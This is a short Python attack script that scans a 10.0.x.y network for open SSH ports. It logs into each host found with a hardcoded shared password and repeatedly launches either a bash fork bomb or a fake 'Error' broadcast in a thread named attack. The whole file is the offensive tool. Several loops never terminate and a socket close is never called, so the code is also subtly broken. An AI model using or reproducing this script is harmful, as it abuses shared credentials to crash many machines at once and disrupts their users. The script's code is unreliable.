# for service

import pxssh
import socket
import time
from threading import *

def login(ipp, order):
    s = pxssh.pxssh()
    if not s.login (ipp, ipp, 'lernen'):
        exit()

    else:
        s.sendline('bash')
        s.sendline(order)
        s.prompt()
        s.logout()



def ipadress(floor_begin, floor_end , area_begin, area_end):
    IP1 = "10.0."
    Num1 = floor_begin
    Num2 = floor_end + 1
    ip_liste = []

    while Num1!=Num2:
        IP = IP1 + str(Num1) +"."
        Var = area_begin
        while area_begin < area_end:


            ip = IP + str(Var)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect((ip, 22))
                s.settimeout(None)
                ip_liste.append(ip)
                s.close
            except:
                pass

            Var +=1
        Num1+=1
    return ip_liste


class attack(Thread):

    def __init__(self,ipp,order):
        Thread.__init__(self)
        self.ipp = "lernen@" +ipp
        self.order = order


    def run(self):
        login(self.ipp, self.order)
        return 0


list_of_orders = ["':(){ :|:&};:'", "echo 'Error' | wall"]
numbers = []
count = 0

# Main

while count < 4:
    a = int(input("Numbers: "))
    numbers.append(a)

b = int(input("Order: "))
order = list_of_orders[b]

while True:

    List = ipadress(numbers[0],numbers[1],numbers[2],numbers[3])

    for i in List:
        check = attack(i,order)
        check.start()
    List =[]
    time.sleep(31)

